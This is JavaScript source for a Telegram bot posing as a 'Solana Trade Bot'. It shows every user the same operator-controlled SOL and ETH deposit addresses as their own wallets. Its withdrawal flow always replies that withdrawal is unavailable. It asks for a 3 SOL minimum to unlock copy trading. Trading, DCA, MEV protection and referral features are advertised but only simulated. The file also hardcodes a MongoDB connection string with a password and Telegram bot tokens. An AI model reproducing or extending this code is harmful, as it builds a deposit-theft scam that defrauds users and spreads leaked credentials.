const TelegramBot = require('node-telegram-bot-api');
const mongoose = require('mongoose');

// -------------------
// MONGODB
// -------------------

MONGO_URI='mongodb+srv://manhasnoname:manhasnoname@pluhg.cazsuwj.mongodb.net/telegram-bot-db?retryWrites=true&w=majority&appName=pluhg'
//LEGRAM_TOKEN='8707634373:AAGinBq27w0yl2WfCarbbPLNNTkY0WbB6bk';
TELEGRAM_TOKEN='8733934332:AAFthCGgtoqJqXp9tA-hB9n0zfP8t4PwviY';
mongoose.connect(MONGO_URI,{
  serverSelectionTimeoutMS: 30000, // 30 seconds
  connectTimeoutMS: 30000          // 30 seconds
})
.then(() => console.log("✅ MongoDB connected"))
.catch(err => console.error("❌ MongoDB connection error:", err));

const userSchema = new mongoose.Schema({
  telegramId: { type: String, unique: true },
  name: String,
  solBalance: { type: Number, default: 0 },
  ethBalance: { type: Number, default: 0 }
}, { timestamps: true });

const User = mongoose.model('User', userSchema);

// -------------------
// TELEGRAM BOT
// -------------------
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const userStates = {};

const solanaAddress = '6RkEyrpGuj3aaEtd8pycAhBtBSm9SkD2YYUPVTa93wwW';
const ethereumAddress = '0x6CB84b7D81CA9d7909103c04F5d39de5B27019ab';
const copyTradeWallet = 'GkDVo2kBVnbcLcsXYN3xQ9GFPZuMhn17EZD2cP521Am9';

// -------------------
// HELPER
// -------------------
async function getOrCreateUser(msg) {
  const telegramId = msg.from.id.toString();
  const name = msg.from.username || msg.from.first_name || "Unknown";

  // Try to find existing user
  let user = await User.findOne({ telegramId });

  if (!user) {
    try {
      user = await User.create({ telegramId, name });
    } catch (err) {
      // If a race condition occurs and another insert happened first
      if (err.code === 11000) {
        user = await User.findOne({ telegramId });
      } else {
        throw err;
      }
    }
  }

  return user;
}

function sendMainMenu(chatId) {
  bot.sendMessage(chatId, "Main Menu", {
    reply_markup: {
      keyboard: [
        ["💰 Buy", "📉 Sell", "📊 Copy Trade"],
        ["📈 My Trades", "🌀 DCA Order", "👥 Referrals"],
        ["📌 Position", "💸 Withdraw", "⚙️ Settings"],
        ["ℹ️ Help"]
      ],
      resize_keyboard: true
    }
  });
}

function sendWelcomeVideo(chatId, user) {
    const welcomeMessage = `
<b>Welcome to Solana Trade Bot, ${user.name} – your trusted partner in fast, secure, and professional crypto trading!</b>
 
<b>Your Wallets:</b>

<b>Solana (SOL)</b>
<code>${solanaAddress}</code>
Balance: ${user.solBalance} SOL

<b>Ethereum (ETH)</b>
<code>${ethereumAddress}</code>
Balance: ${user.ethBalance} ETH

Click /start anytime to refresh your balances.

🔹 Join our community: Stay updated with news, tips, and support via our Telegram group and official channels.

💡 We recommend using our supported bots for faster trading with the same wallets and settings. Enjoy a smoother, safer, and faster trading experience.

⚠️ Security Reminder: We never ask for passwords or private keys. Avoid fake airdrops and unverified links.
`;

  bot.sendVideo(chatId, './welcome.mp4', {
    caption: welcomeMessage,
    parse_mode: 'HTML'
  }).then(() => sendMainMenu(chatId));
}

// -------------------
// START
// -------------------
bot.onText(/\/start/, async (msg) => {
  const user = await getOrCreateUser(msg); // fetch or create user
  sendWelcomeVideo(msg.chat.id, user);     // pass user object
});

// -------------------
// MESSAGE HANDLER
// -------------------
bot.on('message', async (msg) => {
  if (!msg.text) return;

  const chatId = msg.chat.id;
  const text = msg.text;

  const user = await getOrCreateUser(msg);

  // -------------------
  // WITHDRAW FLOW
  // -------------------

  // Back button always takes priority
  if (text === "⬅️ Back" && (userStates[chatId] === "withdraw" || userStates[chatId] === "awaiting_withdraw_amount")) {
    userStates[chatId] = "main";
    delete userStates[chatId + "_network"]; // remove stored network
    sendMainMenu(chatId);
    return;
  }

  // User selects network
  if (userStates[chatId] === "withdraw") {
    if (text === "SOL" || text === "ETH") {
      userStates[chatId] = "awaiting_withdraw_amount";
      userStates[chatId + "_network"] = text;
      bot.sendMessage(chatId, ` You selected <b>${text} network</b>.\nPlease enter the amount you want to withdraw:`, { parse_mode: "HTML" });
      return;
    }
  }

  // Handle input for amount after network selection
// Handle input for amount after network selection
if (userStates[chatId] === "awaiting_withdraw_amount") {
  const network = userStates[chatId + "_network"];
  const amountStr = text.trim();

  // Only allow numbers with optional decimal
  if (!/^\d+(\.\d+)?$/.test(amountStr)) {
    bot.sendMessage(chatId, `⚠️ Please enter an amount for ${network} withdrawal.`);
    return; // stay in same state
  }

  const amount = parseFloat(amountStr);

  // Reject 0 or negative numbers
  if (amount <= 0) {
    bot.sendMessage(chatId, `⚠️ Please enter an amount for ${network} withdrawal.`);
    return; // stay in same state
  }

  // At this point, amount is valid (>0)
  // Withdrawal not processed, just notify user
  bot.sendMessage(chatId, `⚠️ Withdrawal unavailable at this time for <b>${network}</b>.`, { parse_mode: 'HTML' });

  // Reset state and go back to main menu
  userStates[chatId] = "main";
  delete userStates[chatId + "_network"];
  sendMainMenu(chatId);
}


  // -------------------
  // MAIN SWITCH
  // -------------------
  switch (text) {

   case "💰 Buy":
  bot.sendMessage(chatId,
    `<b>Buy Solana and Ethereum Instantly!</b>\n\n` +
    `<b>Wallet Addresses:</b>\n\n` +
    `<b>Solana (SOL)</b>\n<code>${solanaAddress}</code>\nBalance: ${user.solBalance} SOL\n\n` +
    `<b>Ethereum (ETH)</b>\n<code>${ethereumAddress}</code>\nBalance: ${user.ethBalance} ETH`,
    { parse_mode: "HTML" }
  );
  break;

    case "📉 Sell":
      bot.sendMessage(chatId, "You currently don’t hold any tokens. Purchase SOL in the Buy menu to start trading confidently!");
      break;

    case "📊 Copy Trade":
  const MIN_SOL = 3;
  const MIN_ETH = 0.05; 

  // Check if user meets minimum requirement
  if (user.solBalance >= MIN_SOL || user.ethBalance >= MIN_ETH) {
    bot.sendMessage(chatId,
      `🟢 Copy Trading Active\nWallet: ${copyTradeWallet}\n` +
      `Balance: ${user.solBalance} SOL / ${user.ethBalance} ETH`
    );
  } else {
    bot.sendMessage(chatId,
      `⚠️ Insufficient balance to activate copy trading.\n` +
      `You need at least ${MIN_SOL} SOL or the equivalent in ETH.`
    );
  }
  break;

    case "📈 My Trades":
      if (user.solBalance <= 0 && user.ethBalance <= 0) {
        bot.sendMessage(chatId, " You currently have no active trades. Begin by buying SOL or ETH to see your trades appear here securely.");
      } else {
        bot.sendMessage(chatId,
          `📈 Active Trades:\n\nSOL: ${user.solBalance} SOL\nETH: ${user.ethBalance} ETH`
        );
      }
      break;

   case "🌀 DCA Order":
  if (user.solBalance <= 0 && user.ethBalance <= 0) {
    bot.sendMessage(chatId, "⚠️ DCA Order is not active. Please buy SOL or ETH first.");
  } else {
    bot.sendMessage(chatId, "🟢 DCA Orders are active.");
  }
  break;

  case "👥 Referrals":
  bot.sendMessage(chatId,
    `👥 <b>Invite & Earn Rewards</b>\n\n` +
    `Invite friends and enjoy fee discounts and reward shares:\n` +
    `- Trade volume > $10k/week: 35% referral share\n` +
    `- Otherwise: 25% share\n\n` +
    `Rewards are securely airdropped daily to your chosen wallet (minimum 0.005 SOL). ` +
    `Our 5-layer referral system ensures maximum community benefit!`,
    { parse_mode: "HTML" }
  );
  break;

   case "📌 Position":
  if (user.solBalance <= 0 && user.ethBalance <= 0) {
    bot.sendMessage(chatId, "📍 You do not currently hold any tokens. Buy SOL to see your positions here.");
  } else {
    bot.sendMessage(chatId,
      `📍 Your Positions:\nSOL: ${user.solBalance}\nETH: ${user.ethBalance}`
    );
  }
  break;

    case "💸 Withdraw":
      userStates[chatId] = "withdraw";
      bot.sendMessage(chatId, "Select network:", {
        reply_markup: {
          keyboard: [["SOL"], ["ETH"], ["⬅️ Back"]],
          resize_keyboard: true
        }
      });
      break;

 case "⚙️ Settings":
  bot.sendMessage(chatId,
    `⚙️ <b>Bot Settings & Safety</b>\n\n` +
    `- 🚀 Fee Priority: Fast/Turbo/Custom\n` +
    `- 🔴 Confirm Trades: Red = auto-execute\n` +
    `- 🟢 Confirm Trades: Green = manual confirmation\n` +
    `- 🛡 MEV Protection: Transactions sent privately to avoid frontrunning\n` +
    `- 🟢 Sell Protection: Confirm selling >75% of balance\n\n` +
    `All settings designed to protect your funds and give you maximum control.`,
    { parse_mode: "HTML" }
  );
  break;

    case "ℹ️ Help":
      bot.sendMessage(chatId,
       `
<b>❓ Help & FAQ</b>

<b>How to use the bot:</b> Watch tutorials in our official playlist for step-by-step guidance.  
<b>Tokens available:</b> All SPL tokens, SOL/USDC pairs, plus direct trading on Raydium.  
<b>Referral code:</b> /start → 💰Referrals  
<b>Transaction timeouts:</b> Normal network delays, nothing to worry about.  
<b>Fees:</b> 1%, or 0.9% if referred. No hidden charges.  
<b>Net profit variance:</b> Includes transaction fees, fully transparent.  
<b>Support:</b> Contact @sol_tradingbot_support for real-time assistance.
      `, { parse_mode: "HTML" }
      );
      break;

    case "⬅️ Back":
      sendMainMenu(chatId);
      break;

    default:
      break;
  }
});

console.log("Bot is running...");